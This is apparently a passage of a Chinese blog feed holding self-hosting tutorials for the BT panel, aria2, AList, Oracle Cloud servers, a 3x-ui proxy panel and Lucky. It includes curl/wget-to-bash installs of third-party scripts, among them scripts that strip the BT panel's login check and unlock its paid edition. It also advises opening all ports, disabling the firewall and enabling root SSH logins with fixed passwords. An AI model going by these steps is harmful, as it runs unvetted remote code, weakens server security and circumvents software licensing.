<p>巨魔IPA资源：<br><a href="https://pan.quark.cn/s/1d1961f8c778">https://pan.quark.cn/s/1d1961f8c778</a><br>iOS超全资源库：<br><a href="https://drive.uc.cn/s/5f684148dc034">https://drive.uc.cn/s/5f684148dc034</a><br>系统助手：<br><a href="https://joia.cn/system">https://joia.cn/system</a><br>十三资源库：<br><a href="https://tool.joia.cn/">https://tool.joia.cn</a><br>可以查询你的设备是否支持越狱或者巨魔等工具</p>
]]></content>
      <categories>
        <category>os</category>
        <category>ios</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>宝塔面板开心版|企业版|搭建</title>
    <url>/posts/7ae5b50f/</url>
    <content><![CDATA[<ul>
<li>宝塔面板开心版|企业版|搭建，安全高效的服务器运维面板，去除登录验证，保护个人私隐</li>
</ul>
<p>准备工作</p>
<ul>
<li><p>下载并安装SSH连接工具Finalshell：【<a href="https://www.hostbuf.com/t/988.html">点击进入</a>】</p>
</li>
<li><p>准备一个域名并托管到Cloudflare：【<a href="https://dash.cloudflare.com/login">点击进入</a>】</p>
</li>
</ul>
<p>1、关闭防火墙</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw disableCopy</span><br></pre></td></tr></table></figure>

<p>2、更新系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update -y &amp;&amp; apt upgrade -yCopy</span><br></pre></td></tr></table></figure>

<p>3、宝塔官网：【<a href="https://www.bt.cn/">点击进入</a>】</p>
<ul>
<li>开源脚本：【<a href="https://github.com/8838/btpanel-v7.7.0">点击进入</a>】</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sSO https://raw.githubusercontent.com/8838/btpanel-v7.7.0/main/install/install_panel.sh &amp;&amp; bash install_panel.shCopy</span><br></pre></td></tr></table></figure>

<ul>
<li>一键关闭登录验证</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O optimize.sh http://f.cccyun.cc/bt/optimize.sh &amp;&amp; bash optimize.shCopy</span><br></pre></td></tr></table></figure>

<ul>
<li>启动开心版</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sSO https://raw.githubusercontent.com/ztkink/bthappy/main/one_key_happy.sh &amp;&amp; bash one_key_happy.sh</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
        <category>bt</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>bt</tag>
      </tags>
  </entry>
  <entry>
    <title>istore安装aria2配置连接ariang</title>
    <url>/posts/c7c1e77/</url>
    <content><![CDATA[<blockquote>
<p>aria2项目地址：</p>
<p><a href="https://github.com/aria2/aria2">aria2&#x2F;aria2: aria2 is a lightweight multi-protocol &amp; multi-source, cross platform download utility operated in command-line. It supports HTTP&#x2F;HTTPS, FTP, SFTP, BitTorrent and Metalink. (github.com)</a></p>
<p>aria2官网：</p>
<p><a href="https://aria2.github.io/">aria2</a></p>
<p>ariang项目地址：</p>
<p><a href="https://github.com/mayswind/AriaNg?tab=readme-ov-file">mayswind&#x2F;AriaNg: AriaNg, a modern web frontend making aria2 easier to use. (github.com)</a></p>
<p>ariang中文介绍页：</p>
<p><a href="https://ariang.mayswind.net/zh_Hans/">AriaNg (mayswind.net)</a></p>
</blockquote>
<h1 id="aria2运行状态"><a href="#aria2运行状态" class="headerlink" title="aria2运行状态"></a>aria2运行状态</h1><p><img src="/img/aria/1.webp" alt="image-20240908095738153"></p>
<ol>
<li>查看是否<strong>正在运行</strong></li>
<li>打开<strong>启用</strong>按钮</li>
<li>以此用户权限运行选<strong>root</strong></li>
<li>下载目录设置好</li>
</ol>
<h1 id="RPC选项"><a href="#RPC选项" class="headerlink" title="RPC选项"></a>RPC选项</h1><p><img src="/img/aria/4.webp" alt="image-20240908100933969"></p>
<ol>
<li>留意端口号：6800（默认）</li>
<li>RPC认证方式：令牌</li>
<li>随机生成RPC令牌</li>
</ol>
<h1 id="快速配置aria2"><a href="#快速配置aria2" class="headerlink" title="快速配置aria2"></a>快速配置aria2</h1><p><img src="/img/aria/2.webp" alt="image-20240908095904729"></p>
<p><img src="/img/aria/3.webp" alt="image-20240908100004678"></p>
<ol>
<li>下载目录设置好（选软路由外置TF卡或者挂载硬盘的地址）</li>
<li>填入RPC令牌</li>
<li>可以添加第三方BT Tracker:</li>
</ol>
<p><a href="https://trackerslist.com/#/zh?id=aria2">Aria2: (trackerslist.com)</a></p>
<p><a href="https://github.com/ngosang/trackerslist?tab=readme-ov-file">ngosang&#x2F;trackerslist: Updated list of public BitTorrent trackers (github.com)</a></p>
<h1 id="ariang设置"><a href="#ariang设置" class="headerlink" title="ariang设置"></a>ariang设置</h1><h2 id="局域网（ip访问）"><a href="#局域网（ip访问）" class="headerlink" title="局域网（ip访问）"></a>局域网（ip访问）</h2><p>aria2 rpc 地址：<a href="http://192.168.x.x:6800/jsonrpc">http://192.168.X.X:6800/jsonrpc</a></p>
<p><img src="/img/aria/5.webp" alt="image-20240908102056801"></p>
<p><img src="/img/aria/6.webp" alt="image-20240908102133218"></p>
<h2 id="广域网（域名https访问）"><a href="#广域网（域名https访问）" class="headerlink" title="广域网（域名https访问）"></a>广域网（域名https访问）</h2><p>aria2 rpc 地址：https:&#x2F;&#x2F;域名:端口&#x2F;jsonrpc</p>
<p><img src="/img/aria/7.webp" alt="image-20240908102413270"></p>
<p><img src="/img/aria/8.webp" alt="image-20240908102442892"></p>
<ol>
<li>购买域名</li>
<li>托管DNS（Cloudflare，腾讯云，阿里云等）</li>
<li>家宽要做好动态域名解析DDNS</li>
<li>反向代理，给域名申请SSL证书（Lucky大吉，Ngnix Proxy Manager，zoraxy，宝塔面板等）</li>
<li>正向代理默认端口6800，反向代理要注意自定的域名和端口</li>
</ol>
<h1 id="alist连接aria2（只能用ip访问）"><a href="#alist连接aria2（只能用ip访问）" class="headerlink" title="alist连接aria2（只能用ip访问）"></a>alist连接aria2（只能用ip访问）</h1><p><img src="/img/aria/9.webp" alt="image-20240908110630315"></p>
<ol>
<li>aria2 rpc 地址：<a href="http://192.168.x.x:6800/jsonrpc">http://192.168.X.X:6800/jsonrpc</a></li>
<li>aria2 密钥</li>
</ol>
]]></content>
      <categories>
        <category>web</category>
        <category>aria</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>aria</tag>
      </tags>
  </entry>
  <entry>
    <title>docker搭建alist通过smb挂载nas</title>
    <url>/posts/7fc8ee4/</url>
    <content><![CDATA[<p>项目地址：<a href="https://github.com/alist-org/alist">alist-org&#x2F;alist: 🗂️A file list&#x2F;WebDAV program that supports multiple storages, powered by Gin and Solidjs. &#x2F; 一个支持多存储的文件列表&#x2F;WebDAV程序，使用 Gin 和 Solidjs。 (github.com)</a></p>
<p>官网地址：<a href="https://alist.nn.ci/zh/guide/">Introduction | AList文档 (nn.ci)</a></p>
<h1 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull xhofe/alist:latest</span><br></pre></td></tr></table></figure>

<h1 id="创建容器启动"><a href="#创建容器启动" class="headerlink" title="创建容器启动"></a>创建容器启动</h1><h2 id="docker命令"><a href="#docker命令" class="headerlink" title="docker命令"></a>docker命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --restart=unless-stopped -v /etc/alist:/opt/alist/data -p 5244:5244 -e PUID=0 -e PGID=0 -e UMASK=022 --name=<span class="string">&quot;alist&quot;</span> xhofe/alist:latest</span><br></pre></td></tr></table></figure>

<h2 id="或者docker-compose"><a href="#或者docker-compose" class="headerlink" title="或者docker-compose"></a>或者docker-compose</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">alist:</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">&#x27;xhofe/alist:latest&#x27;</span></span><br><span class="line">        <span class="attr">container_name:</span> <span class="string">alist</span></span><br><span class="line">        <span class="attr">volumes:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&#x27;/etc/alist:/opt/alist/data&#x27;</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&#x27;5244:5244&#x27;</span></span><br><span class="line">        <span class="attr">environment:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">PUID=0</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">PGID=0</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">UMASK=022</span></span><br><span class="line">        <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure>

<h1 id="添加存储（SMB为例）"><a href="#添加存储（SMB为例）" class="headerlink" title="添加存储（SMB为例）"></a>添加存储（SMB为例）</h1><p>使用说明：<a href="https://github.com/alist-org/alist/discussions/2215#discussioncomment-4104018">请问smb具体如何使用？ · alist-org&#x2F;alist · Discussion #2215 (github.com)</a></p>
<h2 id="官方示例图"><a href="#官方示例图" class="headerlink" title="官方示例图"></a>官方示例图</h2><p><img src="/img/alist/1.webp" alt="1"></p>
<p><img src="/img/alist/2.webp" alt="2"></p>
<h3 id="关于挂载SMB一级根"><a href="#关于挂载SMB一级根" class="headerlink" title="关于挂载SMB一级根"></a>关于挂载SMB一级根</h3><p><img src="/img/alist/3.webp" alt="3"></p>
<p><img src="/img/alist/4.webp" alt="4"></p>
<h2 id="自用示例图"><a href="#自用示例图" class="headerlink" title="自用示例图"></a>自用示例图</h2><p><img src="/img/alist/a.webp" alt="a"></p>
<p><img src="/img/alist/b.webp" alt="b"></p>
]]></content>
      <categories>
        <category>web</category>
        <category>alist</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>alist</tag>
      </tags>
  </entry>
  <entry>
    <title>甲骨文服务器oraclecloud开新机后必做的几件事情</title>
    <url>/posts/3b69d7e6/</url>
    <content><![CDATA[<h1 id="入站规则打开所有端口和协议解决无法ssh连接及ping通"><a href="#入站规则打开所有端口和协议解决无法ssh连接及ping通" class="headerlink" title="入站规则打开所有端口和协议解决无法ssh连接及ping通"></a>入站规则打开所有端口和协议解决无法ssh连接及ping通</h1><ol>
<li>在服务器实例中，点击子网进入。</li>
<li>点击安全列表。</li>
<li>入站规则删除所有并添加入站规则：源 0.0.0.0&#x2F;0，协议选择所有协议</li>
</ol>
<h1 id="无限更换ip"><a href="#无限更换ip" class="headerlink" title="无限更换ip"></a>无限更换ip</h1><ol>
<li>进入实例，来到：附加的 VNIC</li>
<li>查看详细信息</li>
<li>进入：IP 地址</li>
<li>编辑</li>
<li>选择：没有公共 IP并更新</li>
<li>没有公共 IP了</li>
<li>编辑</li>
<li>选择：临时公共 IP并更新</li>
<li>更换IP成功</li>
</ol>
<h1 id="检查IP，开放端口（可选）"><a href="#检查IP，开放端口（可选）" class="headerlink" title="检查IP，开放端口（可选）"></a>检查IP，开放端口（可选）</h1><h3 id="检测IP是否可用"><a href="#检测IP是否可用" class="headerlink" title="检测IP是否可用"></a>检测IP是否可用</h3><p>如果连接不上机器，需在甲骨文管理后台刷IP直至获取到一个可用IP！</p>
<h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p><strong>安装网络工具</strong><br><code>apt install net-tools</code></p>
<p><strong>安装iptables</strong><br><code>sudo apt-get install iptables</code></p>
<p><strong>安装iptables-persistent</strong><br><code>sudo apt-get install iptables-persistent</code></p>
<blockquote>
<p>会要求您保存当前&#x2F;现有的 iptables 规则，分IP4和IP6，可以默认 YES<br>一般情况下，ubuntu安装好的时候，iptables会被安装上，如果没有的话那就安装上吧</p>
</blockquote>
<p><strong>添加规则</strong><br><code>iptables -I INPUT -p tcp --dport 80 -j ACCEPT</code></p>
<p><strong>持久化保存规则</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo netfilter-persistent save</span><br><span class="line">sudo netfilter-persistent reload</span><br></pre></td></tr></table></figure>

<p>完成上述操作就可以永久打开我们需要的端口了</p>
<h3 id="查看-与-关闭端口"><a href="#查看-与-关闭端口" class="headerlink" title="查看 与 关闭端口"></a>查看 与 关闭端口</h3><p>通过 <code>iptables -L -n --line-number</code> 可以显示规则和相对应的编号<br><code>iptables -D INPUT 1</code> 删除INPUT链编号为1的规则。</p>
<h3 id="查看-防火墙状态"><a href="#查看-防火墙状态" class="headerlink" title="查看 防火墙状态"></a>查看 防火墙状态</h3><p>可以使用 <code>sudo netstat -lnp</code> 和 <code>lsof -i:port</code> 工具来识别打开端口后面的进程&#x2F;二进制文件。</p>
<p><strong>防火墙 开放 端口</strong><br><code>sudo ufw allow 8080</code></p>
<p><strong>防火墙 关闭 端口</strong><br><code>sudo fuser -k 8080/tcp</code></p>
<blockquote>
<p>常用命令</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0.查看已经开启的状态	sudo service ufw status</span><br><span class="line">1.查看已经开启的端口	sudo ufw status</span><br><span class="line">2.打开端口	sudo ufw allow 8080</span><br><span class="line">3.开启防火墙	sudo ufw <span class="built_in">enable</span></span><br><span class="line">4.重启防火墙	sudo ufw reload</span><br><span class="line">5.再次查看一下端口是否已开放	sudo ufw status</span><br></pre></td></tr></table></figure>

<h1 id="开启root"><a href="#开启root" class="headerlink" title="开启root"></a>开启root</h1><p>通常在新机器开机后是试用私钥连接SSH，为了方便使用我们开启root登录，有三种方式：</p>
<h2 id="1-利用-cloud-init脚本来开启root账号密码登录"><a href="#1-利用-cloud-init脚本来开启root账号密码登录" class="headerlink" title="1.利用 cloud-init脚本来开启root账号密码登录"></a>1.利用 cloud-init脚本来开启root账号密码登录</h2><p>脚本如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> root:meeetk |sudo chpasswd root</span><br><span class="line">sudo sed -i <span class="string">&#x27;s/^#\?PermitRootLogin.*/PermitRootLogin yes/g&#x27;</span> /etc/ssh/sshd_config;</span><br><span class="line">sudo sed -i <span class="string">&#x27;s/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g&#x27;</span> /etc/ssh/sshd_config;</span><br><span class="line">sudo service sshd restart</span><br></pre></td></tr></table></figure>

<p>默认密码是: meeetk<br>登录后一定要修改密码！命令：passwd</p>
<h2 id="2-使用密钥登录系统以后"><a href="#2-使用密钥登录系统以后" class="headerlink" title="2.使用密钥登录系统以后"></a>2.使用密钥登录系统以后</h2><p>执行如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">passwd</span><br></pre></td></tr></table></figure>

<p>按提示刷入密码，重复输入密码。<br>接着输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> root:329105sz |sudo chpasswd root</span><br><span class="line">sudo sed -i <span class="string">&#x27;s/^#\?PermitRootLogin.*/PermitRootLogin yes/g&#x27;</span> /etc/ssh/sshd_config;</span><br><span class="line">sudo sed -i <span class="string">&#x27;s/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g&#x27;</span> /etc/ssh/sshd_config;</span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure>

<p>重启sshd服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service sshd restart</span><br></pre></td></tr></table></figure>

<h2 id="3、使用密钥登录系统以后"><a href="#3、使用密钥登录系统以后" class="headerlink" title="3、使用密钥登录系统以后"></a>3、使用密钥登录系统以后</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">vi /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>把ssh-rsa之前的内容都删除掉.<br><code>vi /etc/ssh/sshd_config</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">找到PermitRootLogin, 把前面的<span class="comment">#去掉</span></span><br><span class="line">更改为 PermitRootLogin <span class="built_in">yes</span></span><br><span class="line">找到PasswordAuthentication</span><br><span class="line">更改为 PasswordAuthentication <span class="built_in">yes</span></span><br><span class="line">退出编辑</span><br><span class="line">passwd 更改密码`</span><br><span class="line">`reboot 重启vps</span><br></pre></td></tr></table></figure>

<p>所用到的命令;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi	文本编辑器</span><br><span class="line"><span class="built_in">cd</span>	进入目录</span><br><span class="line"><span class="built_in">pwd</span>	查看当前位置</span><br><span class="line"><span class="built_in">ls</span>	查看当前文件夹文件</span><br><span class="line"><span class="built_in">ls</span> -a	查看当前文件夹所有文件</span><br><span class="line">vi	编辑器命令</span><br><span class="line">i	进入编辑模式</span><br><span class="line">esc	回到命令模式</span><br><span class="line">:wq	保存并退出</span><br></pre></td></tr></table></figure>

<p>最后记得重启服务器<br><code>reboot 重启vps</code><br>然后就可以用root登录SSH了！</p>
<h1 id="升级软件包，安装BBR加速，虚拟内存"><a href="#升级软件包，安装BBR加速，虚拟内存" class="headerlink" title="升级软件包，安装BBR加速，虚拟内存"></a>升级软件包，安装BBR加速，虚拟内存</h1><h2 id="1，升级软件包"><a href="#1，升级软件包" class="headerlink" title="1，升级软件包"></a>1，升级软件包</h2><p>简要说明：<br>apt update：只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure>

<p>apt upgrade：更新已安装的软件包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt upgrade</span><br></pre></td></tr></table></figure>

<h2 id="2，安装BBR加速"><a href="#2，安装BBR加速" class="headerlink" title="2，安装BBR加速"></a>2，安装BBR加速</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate <span class="string">&quot;https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;</span> &amp;&amp; <span class="built_in">chmod</span> +x tcp.sh &amp;&amp; ./tcp.sh</span><br></pre></td></tr></table></figure>

<p>选择安装 bbrplus，过程中需要选择两次 <code>NO</code>，最后选择<code>Y</code>重启服务器<br>重启完毕后再次运行安装脚本，选择<code>启动bbrplus</code><br>完毕！</p>
<h2 id="3，虚拟内存"><a href="#3，虚拟内存" class="headerlink" title="3，虚拟内存"></a>3，虚拟内存</h2><p>小型鸡专用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.moerats.com/usr/shell/swap.sh &amp;&amp; bash swap.sh</span><br></pre></td></tr></table></figure>

<h1 id="安装-哪吒面板-可选"><a href="#安装-哪吒面板-可选" class="headerlink" title="安装 哪吒面板(可选)"></a>安装 哪吒面板(可选)</h1><p>被控机的安装<br>登陆面板机后台，添加一个主机，会生成秘钥，然后在被控机上输入代码（其实和安装主控的代码是一样的）<br>国外机<code>curl -L https://raw.githubusercontent.com/naiba/nezha/master/script/install.sh -o nezha.sh &amp;&amp; chmod +x nezha.sh &amp;&amp; ./nezha.sh</code><br>国内机<code>curl -L https://raw.sevencdn.com/naiba/nezha/master/script/install.sh -o nezha.sh &amp;&amp; chmod +x nezha.sh &amp;&amp; ./nezha.sh</code><br>选择8，然后第一个输入你刚才不带套的那个域名，端口默认，秘钥就是刚才添加主机时的那个秘钥。<br>【或者在面板机后台直接复制一键安装脚本，在被控机运行即可】</p>
]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
        <category>centos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ubuntu</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>3x-ui最新伊朗xray面板安装</title>
    <url>/posts/bfdce853/</url>
    <content><![CDATA[<p>伊朗版3x-ui面板，一键搭建xray面板实现科学上网，基本实现一键脚本安装，特别方便！x-ui面板搭建教程|v2ray节点配置，一键安装</p>
<h1 id="1、购买服务器并解析域名"><a href="#1、购买服务器并解析域名" class="headerlink" title="1、购买服务器并解析域名"></a>1、购买服务器并解析域名</h1><h1 id="2、一键安装依赖包（适合Ubuntu-Debian系统，不一定需要）"><a href="#2、一键安装依赖包（适合Ubuntu-Debian系统，不一定需要）" class="headerlink" title="2、一键安装依赖包（适合Ubuntu&#x2F;Debian系统，不一定需要）"></a>2、一键安装依赖包（适合Ubuntu&#x2F;Debian系统，不一定需要）</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update -y&amp;&amp;apt install -y curl&amp;&amp;apt install -y socatCopy</span><br></pre></td></tr></table></figure>

<h1 id="3、安装伊朗版xray面板：【点击进入】注意：建议用Debian或者Ubuntu系统"><a href="#3、安装伊朗版xray面板：【点击进入】注意：建议用Debian或者Ubuntu系统" class="headerlink" title="3、安装伊朗版xray面板：【点击进入】注意：建议用Debian或者Ubuntu系统"></a>3、安装伊朗版xray面板：【<a href="https://github.com/MHSanaei/3x-ui">点击进入</a>】注意：建议用Debian或者Ubuntu系统</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -Ls https://raw.githubusercontent.com/mhsanaei/3x-ui/master/install.sh)Copy</span><br></pre></td></tr></table></figure>

<ul>
<li><p>放行端口：选择21，然后输入你想放行的端口（端口要先放行，不然下面申请证书会报错）</p>
</li>
<li><p>安装证书：选择15，输入你解析好的域名</p>
</li>
<li><p>启用BBR加速：选择19（如果想单独安装，用下面的命令）</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate <span class="string">&quot;https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;</span> &amp;&amp; <span class="built_in">chmod</span> +x tcp.sh &amp;&amp; ./tcp.sh</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>proxy</category>
        <category>xray</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>xray</tag>
      </tags>
  </entry>
  <entry>
    <title>lucky大吉：集DDNS，端口转发，反向代理和申请SSL证书等功能的神器</title>
    <url>/posts/7ce10649/</url>
    <content><![CDATA[<p>项目地址：<a href="https://github.com/gdy666/lucky">gdy666&#x2F;lucky: 软硬路由公网神器,ipv6&#x2F;ipv4 端口转发,反向代理,DDNS,WOL,ipv4 stun内网穿透,cron,acme,阿里云盘,ftp,webdav,filebrowser (github.com)</a></p>
<p>对NAS用户来说，内网访问是基础功能，而能够玩转公网(外网)访问，才能使NAS真正成为个人专属家庭服务器。所以今天这篇文章，就跟大家聊聊如何实现<strong>安全，快速，便捷</strong>的家庭NAS公网访问</p>
<p><strong>想从外网（公网）访问家中的NAS，首先最好还是拥有公网IPv4。如果运营商实在不给公网IPv4的话，可以考虑IPv6</strong></p>
<p><strong>所以这篇教程是基于有公网IP的情况下进行的。</strong></p>
<h3 id="不安全的外网访问方式——正向代理-HTTP"><a href="#不安全的外网访问方式——正向代理-HTTP" class="headerlink" title="不安全的外网访问方式——正向代理+HTTP"></a><strong>不安全的外网访问方式——正向代理+HTTP</strong></h3><p>很多新手NAS玩家在获得公网IP之后，会使用http+正向代理，也就是在路由器中直接将NAS某项服务的内网端口映射到外网，然后通过”<a href="http://ip/">http://ip</a> 地址或域名+外网端口号”访问，就像下面这样： </p>
<p><img src="/img/lucky/1.webp" alt="img"></p>
<p>比如我想从公司(外网)访问家里NAS中的Home Assistant，只要输入http:&#x2F;&#x2F;域名:18123即可。虽然看起来貌似设置很简单，但是这种方式存在几个非常严重的问题，在当下糟糕的网络安全环境中，基本等同于裸奔，十分危险：</p>
<ul>
<li>Http协议使用明文传输，<strong>完全没有保密性</strong>可言</li>
<li>浏览器会报<strong>危险页面</strong>，比如Chrome会将所有HTTP协议网站自动标识为不安全网站</li>
<li>无法验证身份，对服务器端(也就是NAS)<strong>缺乏保护</strong></li>
<li>NAS中每<strong>一个服务都需要单独端口号</strong>，数量多了以后根本记不住，并且被扫描的概率太大</li>
</ul>
<p><img src="/img/lucky/2.webp" alt="img"></p>
<h3 id="安全的外网访问方式——反向代理-HTTPS"><a href="#安全的外网访问方式——反向代理-HTTPS" class="headerlink" title="安全的外网访问方式——反向代理+HTTPS"></a><strong>安全的外网访问方式——反向代理+HTTPS</strong></h3><p><strong>而反向代理+Https则完全规避了以上所有缺点。</strong>既能保护NAS主机，又可以通过Https建立安全的加密访问通道。对于一般用户来说，没必要了解正反代理之间差异的技术性问题，只要知道反代+Https是目前相对比较安全的公网访问方案就可以了(网络安全没有绝对)。</p>
<p><img src="/img/lucky/3.webp" alt="img"></p>
<p>我把<strong>两种方案的区别做成表格放在下面：</strong></p>
<p><img src="/img/lucky/4.webp" alt="img"></p>
<p>传统的反代+Https方案部署需要用到DDNS-GO和NPM(Nginx Proxy Manager)，稍微有点复杂，所以很多新入坑NAS的小伙伴也就放弃了，宁可冒险使用HTTP裸奔。但今天给大家带来一款非常出色的国产开源软件Lucky，能够将整个部署过程完全傻瓜化，即便是小白也能跟着轻松完成。在此也特意感谢Lucky的作者GDY大神。</p>
<p><img src="/img/lucky/5.webp" alt="img"></p>
<p>这款软件支持包括Windows、Linux、Openwrt甚至小米路由器内安装。<strong>今天的教程将在Docker中部署，仍然使用绿联DX4600举例，其他品牌NAS部署方法基本一致。</strong>整个流程分为5步，分别是购买域名，安装Lucky，设置DDNS，设置SSL证书和设置HTTPS反向代理。接下来就正式开始~~</p>
<h3 id="Step-1、域名购买"><a href="#Step-1、域名购买" class="headerlink" title="Step 1、域名购买"></a><strong>Step 1、域名购买</strong></h3><p>想通过外网访问，首先当然需要一个域名，可以在服务商处购买，这里我以阿里云为例，其他如腾讯云，华为云等域名购买和设置方法大同小异。成功购买域名并通过实名认证后，列表中就会出现域名，点击后面的“解析”。</p>
<p><img src="/img/lucky/6.webp" alt="img"></p>
<p>在解析设置页面中，点击“添加记录”，记录类型选择A，主机记录填入@，解析请求来源默认，记录值填写当前家里的公网IP地址，TTL默认10分钟即可。</p>
<p><img src="/img/lucky/7.webp" alt="img"></p>
<p>如果不知道家里公网IP地址，可以直接打开百度并搜索IP两个字母获取。</p>
<p><img src="/img/lucky/8.webp" alt="img"></p>
<p>接下来再重复一次上面的操作，只不过这次在主机记录中填入*(第一次是@)，其他选项均保持不变。这样，我们就有了两条域名解析记录。第一条是专门解析主域名的，第二条则是解析二级域名的，以*来代替所有前缀。看到状态为“启用”就说明配置正确。</p>
<p><img src="/img/lucky/9.webp" alt="img"></p>
<p>接着点击右上角的头像，并在弹出菜单中点击Access Key管理。</p>
<p><img src="/img/lucky/10.webp" alt="img"></p>
<p>创建AccessKey，<strong>一定要把自己的AccessKey复制到电脑的文档中保管，因为只能获取一次，后面不会再次提供。</strong>到这里为止，域名的部分就都搞好了，非常简单。</p>
<p><img src="/img/lucky/11.webp" alt="img"></p>
<h3 id="Step-2、在Docker中安装Lucky"><a href="#Step-2、在Docker中安装Lucky" class="headerlink" title="Step 2、在Docker中安装Lucky"></a><strong>Step 2、在Docker中安装Lucky</strong></h3><p>转到NAS端，在镜像管理中搜索gdy666&#x2F;lucky并下载：</p>
<p><img src="/img/lucky/12.webp" alt="img"></p>
<p>下载完成后在本地镜像中找到，创建容器：</p>
<p><img src="/img/lucky/13.webp" alt="img"></p>
<p>取一个自己喜欢的名字，然后点击下一步：</p>
<p><img src="/img/lucky/14.webp" alt="img"></p>
<p>重启策略选择“容器退出时总是重启容器”，然后不要点击下一步，而是转到上方的网络选项卡。</p>
<p><img src="/img/lucky/15.webp" alt="img"></p>
<p>由于需要将Lucky作为反代服务器使用，因此<strong>网络模式必须选择host，不能使用常用的Bridge！</strong></p>
<p><img src="/img/lucky/16.webp" alt="img"></p>
<p>转到储存空间选项卡，将Lucky安装位置设置在Docker&#x2F;goodluck，装载路径中填写&#x2F;goodluck，并给予完全的读写权限：</p>
<p><img src="/img/lucky/17.webp" alt="img"></p>
<p>端口设置保持默认的16601即可，其他选项也保持默认。直接点击下一步并启动运行：</p>
<p><img src="/img/lucky/18.webp" alt="img"></p>
<p>打开电脑浏览器，在地址栏中输入IP+16601，进入Lucky管理后台：</p>
<p><img src="/img/lucky/19.webp" alt="img"></p>
<p>缺省用户名和密码均为666，填入后登录，并点击左侧的“设置”选项卡，重新设置一套新的管理账号和密码，确保安全：</p>
<p><img src="/img/lucky/20.webp" alt="img"></p>
<h3 id="Step-3、设置DDNS-动态域名解析"><a href="#Step-3、设置DDNS-动态域名解析" class="headerlink" title="Step 3、设置DDNS(动态域名解析)"></a><strong>Step 3、设置DDNS(动态域名解析)</strong></h3><p>接下来在左侧找到“动态域名”选项卡，并点击“添加DDNS任务”。</p>
<p><img src="/img/lucky/21.webp" alt="img"></p>
<p>DDNS任务名称随便填自己喜欢的，操作模式选择“简易模式”，DNS服务商选择自己域名的服务商(我这里是阿里云)，并将前面保存下来的AccessKey ID和 Secret填入，然后按照自己家的公网IP类型选择v4或v6，获取方式选择通过接口获取，最后域名列表填写两行，第一行是主域名，第二行是*.主域名，代表二级域名。其他全部默认，完毕后点击添加：</p>
<p><img src="/img/lucky/22.webp" alt="img"></p>
<p>稍等片刻，看到同步结果为“域名IP和公网IP一致”，就说明DDNS设置成功了。多说一句，这里设置的DDNS其实和使用其他单独的DDNS应用(比如DDNS-GO)效果是一样的。</p>
<p><img src="/img/lucky/23.webp" alt="img"></p>
<h3 id="Step-4、申请SSL证书"><a href="#Step-4、申请SSL证书" class="headerlink" title="Step 4、申请SSL证书"></a><strong>Step 4、申请SSL证书</strong></h3><p>接下来我们需要为自己的域名申请SSL证书。转到“安全管理”选项卡，并点击“添加证书”。</p>
<p><img src="/img/lucky/24.webp" alt="img"></p>
